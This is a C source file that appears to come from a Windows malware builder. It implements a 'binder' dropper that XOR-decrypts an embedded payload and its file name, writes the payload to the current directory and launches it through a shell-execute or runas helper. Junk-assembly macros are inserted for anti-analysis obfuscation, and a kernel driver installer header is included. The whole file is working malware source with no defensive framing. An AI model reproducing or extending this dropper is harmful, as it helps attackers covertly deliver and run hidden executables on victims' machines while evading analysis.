#include "global_config.h"
#include "binder_payload.h"
#include "crypto.h"
#include "kernel_driver_installer_invoker.h"
#include "junk_asm.h"

#include "functions_table.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

#include "common_utils.h"

#pragma warning(disable:4996)

#if BINDER==1

extern char binder_payload[];

static void drop_and_open_binder_file()
{
    ASM_JUNK;


    //
    char* binder_payload_decrypted = xor_encrypt_decrypt(binder_payload, (char*)BINDER_ENCRYPTION_KEY, BINDER_PAYLOAD_LEN);

    DBG_MSG("drop_and_open_binder_file() - binder_payload_decrypted.\n");

    //
    char* binder_filename_decrypted = (char*)calloc(BINDER_FILENAME_LEN + 1, 1);

    strncpy(binder_filename_decrypted,
        (char*)xor_encrypt_decrypt((char*)BINDER_FILENAME, (char*)BINDER_ENCRYPTION_KEY, BINDER_FILENAME_LEN),
        BINDER_FILENAME_LEN);

    DBG_MSG("drop_and_open_binder_file() - binder_filename_decrypted: %s\n", binder_filename_decrypted);

    //
    char current_path[MAX_PATH];
    DWORD dwRet;

    dwRet = l_GetCurrentDirectoryA(MAX_PATH, (LPTSTR)current_path);


    if (dwRet == 0)
    {
        DBG_MSG("drop_and_open_binder_file() - GetCurrentDirectory() failed (%d)\n", l_GetLastError());
        return;
    }
    if (dwRet > MAX_PATH)
    {
        DBG_MSG("drop_and_open_binder_file() - Buffer too small; need %d characters\n", dwRet);
        return;
    }


    DBG_MSG("drop_and_open_binder_file() - current_path: %s\n", current_path);

    //
    strcat(current_path, "\\");
    strcat(current_path, binder_filename_decrypted);

    free(binder_filename_decrypted);

    DBG_MSG("drop_and_open_binder_file() - Save the binder file content to: %s\n", current_path);
    bool w_res = write_file(current_path, binder_payload_decrypted, BINDER_PAYLOAD_LEN);

    //
    DBG_MSG("drop_and_open_binder_file() - shell execute the file: %s\n", current_path);

    SHELLEXECUTEINFOA * sei;

    sei = open_or_runas_executor(current_path, FALSE);
}

#else

static void drop_and_open_binder_file()
{
    ASM_JUNK;
}

#endif

void wrapper_drop_and_open_binder_file() {
    ASM_JUNK;
    drop_and_open_binder_file();
}

